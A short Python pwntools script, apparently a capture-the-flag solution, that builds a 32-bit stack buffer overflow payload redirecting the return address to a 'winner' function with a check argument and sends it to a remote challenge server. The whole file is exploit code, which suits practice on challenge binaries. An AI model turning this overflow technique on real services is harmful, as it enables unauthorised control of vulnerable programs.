# RazviOverflow
# Python3
from pwn import *
import sys

padding = b"A" * 0x48
padding += B"B" * 0x4
winners_level_address = 0x8049196 #\x96\x91\x04\x08
check_value = 0x182

payload = padding + p32(winners_level_address) + b"C" * 0x4 + p32(check_value)

print(payload)

#binary = process("./program")
binary = remote("chals20.cybercastors.com",14434)
print(binary.recv())
binary.sendline(payload)
print(binary.recvall())

